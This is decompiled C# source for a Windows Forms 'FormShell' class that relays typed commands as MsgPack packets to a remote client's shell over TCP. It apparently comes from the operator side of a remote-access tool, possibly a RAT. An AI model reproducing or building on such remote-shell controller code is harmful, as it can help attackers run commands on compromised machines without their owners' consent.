using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000073 RID: 115
	public partial class FormShell : Form
	{
		// Token: 0x17000077 RID: 119
		// (get) Token: 0x060002AE RID: 686 RVA: 0x000201EE File Offset: 0x0001E3EE
		// (set) Token: 0x060002AF RID: 687 RVA: 0x000201F6 File Offset: 0x0001E3F6
		public Form1 F { get; set; }

		// Token: 0x17000078 RID: 120
		// (get) Token: 0x060002B0 RID: 688 RVA: 0x000201FF File Offset: 0x0001E3FF
		// (set) Token: 0x060002B1 RID: 689 RVA: 0x00020207 File Offset: 0x0001E407
		internal Clients Client { get; set; }

		// Token: 0x060002B2 RID: 690 RVA: 0x00020210 File Offset: 0x0001E410
		public FormShell()
		{
			this.InitializeComponent();
		}

		// Token: 0x060002B3 RID: 691 RVA: 0x00020220 File Offset: 0x0001E420
		private void TextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.Client != null && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.textBox1.Text))
			{
				if (this.textBox1.Text == "cls".ToLower())
				{
					this.richTextBox1.Clear();
					this.textBox1.Clear();
				}
				if (this.textBox1.Text == "exit".ToLower())
				{
					base.Close();
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "shellWriteInput";
				msgPack.ForcePathObject("WriteInput").AsString = this.textBox1.Text;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				this.textBox1.Clear();
			}
		}

		// Token: 0x060002B4 RID: 692 RVA: 0x0002030C File Offset: 0x0001E50C
		private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "shellWriteInput";
			msgPack.ForcePathObject("WriteInput").AsString = "exit";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060002B5 RID: 693 RVA: 0x00020368 File Offset: 0x0001E568
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}
	}
}
